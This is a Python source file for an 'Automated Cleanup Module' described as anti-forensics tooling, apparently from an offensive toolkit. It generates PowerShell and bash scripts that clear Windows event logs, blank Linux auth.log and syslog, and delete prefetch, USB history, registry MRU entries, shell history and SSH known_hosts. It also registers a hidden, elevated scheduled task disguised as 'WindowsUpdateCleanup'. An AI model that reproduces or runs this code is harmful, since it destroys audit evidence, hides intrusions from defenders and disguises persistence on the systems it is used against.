#!/usr/bin/env python3
"""
Automated Cleanup Module
Proactive artifact removal and anti-forensics
"""

from typing import List, Dict
from dataclasses import dataclass


@dataclass
class CleanupTask:
    """Represents a single cleanup task"""
    name: str
    description: str
    command: str
    risk_level: str  # 'low', 'medium', 'high'
    frequency: str   # 'continuous', 'hourly', 'daily', 'on_exit'


class CleanupManager:
    """
    Manages automated cleanup and anti-forensics
    Removes operational artifacts proactively, not reactively
    """
    
    def __init__(self, platform: str = "windows"):
        """
        Initialize cleanup manager
        
        Args:
            platform: Target platform ('windows' or 'linux')
        """
        self.platform = platform.lower()
        self.tasks = self._initialize_tasks()
    
    def _initialize_tasks(self) -> List[CleanupTask]:
        """Initialize platform-specific cleanup tasks"""
        if self.platform == "windows":
            return self._windows_tasks()
        elif self.platform == "linux":
            return self._linux_tasks()
        else:
            raise ValueError(f"Unsupported platform: {self.platform}")
    
    def _windows_tasks(self) -> List[CleanupTask]:
        """Windows cleanup tasks"""
        return [
            CleanupTask(
                name="PowerShell History",
                description="Clear PowerShell command history",
                risk_level="low",
                frequency="continuous",
                command="Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
            ),
            CleanupTask(
                name="Recent Documents",
                description="Clear recent document history",
                risk_level="medium",
                frequency="hourly",
                command='Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Recent\\*" -Force -ErrorAction SilentlyContinue'
            ),
            CleanupTask(
                name="Temp Files",
                description="Clear temporary files created during operation",
                risk_level="low",
                frequency="hourly",
                command='Remove-Item "$env:TEMP\\*" -Recurse -Force -ErrorAction SilentlyContinue'
            ),
            CleanupTask(
                name="Prefetch Cleanup",
                description="Remove prefetch entries for our tools",
                risk_level="medium",
                frequency="daily",
                command='Remove-Item "C:\\Windows\\Prefetch\\*" -Force -ErrorAction SilentlyContinue'
            ),
            CleanupTask(
                name="Event Log Cleanup",
                description="Selectively clear suspicious event log entries",
                risk_level="high",
                frequency="on_exit",
                command="""
$logsToClean = @('Security', 'System', 'Application')
foreach ($log in $logsToClean) {
    wevtutil cl $log
}
"""
            ),
            CleanupTask(
                name="Browser History",
                description="Clear browser history and cache",
                risk_level="medium",
                frequency="daily",
                command="""
Remove-Item "$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache\\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\\Microsoft\\Windows\\History\\*" -Recurse -Force -ErrorAction SilentlyContinue
"""
            ),
            CleanupTask(
                name="Registry Cleanup",
                description="Remove registry artifacts",
                risk_level="medium",
                frequency="on_exit",
                command="""
Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue
"""
            ),
            CleanupTask(
                name="USB History",
                description="Clear USB device connection history",
                risk_level="high",
                frequency="on_exit",
                command="""
Remove-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR' -Recurse -Force -ErrorAction SilentlyContinue
"""
            )
        ]
    
    def _linux_tasks(self) -> List[CleanupTask]:
        """Linux cleanup tasks"""
        return [
            CleanupTask(
                name="Bash History",
                description="Clear bash command history",
                risk_level="low",
                frequency="continuous",
                command="history -c && rm -f ~/.bash_history"
            ),
            CleanupTask(
                name="Temp Files",
                description="Clear temporary files",
                risk_level="low",
                frequency="hourly",
                command="rm -rf /tmp/* /var/tmp/*"
            ),
            CleanupTask(
                name="Log Cleanup",
                description="Clear operational log entries",
                risk_level="high",
                frequency="on_exit",
                command="""
echo '' > /var/log/auth.log
echo '' > /var/log/syslog
"""
            ),
            CleanupTask(
                name="SSH Artifacts",
                description="Remove SSH connection artifacts",
                risk_level="medium",
                frequency="on_exit",
                command="rm -f ~/.ssh/known_hosts"
            ),
            CleanupTask(
                name="Shell Config",
                description="Clean shell configuration artifacts",
                risk_level="low",
                frequency="hourly",
                command="""
sed -i '/# operational/d' ~/.bashrc
sed -i '/# operational/d' ~/.bash_profile
"""
            )
        ]
    
    def get_tasks_by_frequency(self, frequency: str) -> List[CleanupTask]:
        """Get cleanup tasks for specific frequency"""
        return [task for task in self.tasks if task.frequency == frequency]
    
    def get_low_risk_tasks(self) -> List[CleanupTask]:
        """Get low-risk cleanup tasks safe to run frequently"""
        return [task for task in self.tasks if task.risk_level == 'low']
    
    def get_all_tasks(self) -> List[CleanupTask]:
        """Get all cleanup tasks"""
        return self.tasks
    
    def generate_cleanup_script(self, frequency: str = None) -> str:
        """
        Generate cleanup script
        
        Args:
            frequency: Filter by frequency (None for all tasks)
            
        Returns:
            Platform-specific cleanup script
        """
        if frequency:
            tasks = self.get_tasks_by_frequency(frequency)
        else:
            tasks = self.get_all_tasks()
        
        if self.platform == "windows":
            return self._generate_windows_cleanup(tasks)
        else:
            return self._generate_linux_cleanup(tasks)
    
    def _generate_windows_cleanup(self, tasks: List[CleanupTask]) -> str:
        """Generate Windows PowerShell cleanup script"""
        script = "# Automated Cleanup Script\n"
        script += "# Generated for operational security\n\n"
        
        script += "function Remove-Artifacts {\n"
        for task in tasks:
            script += f"    # {task.name} - {task.description}\n"
            script += f"    # Risk: {task.risk_level}, Frequency: {task.frequency}\n"
            script += f"    {task.command}\n\n"
        script += "}\n\n"
        
        script += "# Execute cleanup\n"
        script += "Remove-Artifacts\n"
        
        return script
    
    def _generate_linux_cleanup(self, tasks: List[CleanupTask]) -> str:
        """Generate Linux bash cleanup script"""
        script = "#!/bin/bash\n"
        script += "# Automated Cleanup Script\n"
        script += "# Generated for operational security\n\n"
        
        script += "cleanup_artifacts() {\n"
        for task in tasks:
            script += f"    # {task.name} - {task.description}\n"
            script += f"    # Risk: {task.risk_level}, Frequency: {task.frequency}\n"
            script += f"    {task.command}\n\n"
        script += "}\n\n"
        
        script += "# Execute cleanup\n"
        script += "cleanup_artifacts\n"
        
        return script
    
    def generate_scheduled_cleanup(self) -> str:
        """
        Generate scheduled task for automated cleanup
        
        Returns:
            Platform-specific scheduled task configuration
        """
        if self.platform == "windows":
            return self._generate_windows_scheduled_task()
        else:
            return self._generate_linux_cron()
    
    def _generate_windows_scheduled_task(self) -> str:
        """Generate Windows scheduled task for cleanup"""
        return """
# Schedule automated cleanup to run hourly
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command "Remove-Artifacts"'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration ([TimeSpan]::MaxValue)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName 'WindowsUpdateCleanup' -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
"""
    
    def _generate_linux_cron(self) -> str:
        """Generate Linux cron job for cleanup"""
        return """
# Add to crontab for hourly cleanup
# Run: crontab -e
# Add line:
0 * * * * /path/to/cleanup_script.sh >/dev/null 2>&1
"""
    
    def get_cleanup_summary(self) -> Dict:
        """Get summary of cleanup configuration"""
        return {
            'platform': self.platform,
            'total_tasks': len(self.tasks),
            'by_frequency': {
                'continuous': len(self.get_tasks_by_frequency('continuous')),
                'hourly': len(self.get_tasks_by_frequency('hourly')),
                'daily': len(self.get_tasks_by_frequency('daily')),
                'on_exit': len(self.get_tasks_by_frequency('on_exit'))
            },
            'by_risk': {
                'low': len([t for t in self.tasks if t.risk_level == 'low']),
                'medium': len([t for t in self.tasks if t.risk_level == 'medium']),
                'high': len([t for t in self.tasks if t.risk_level == 'high'])
            }
        }
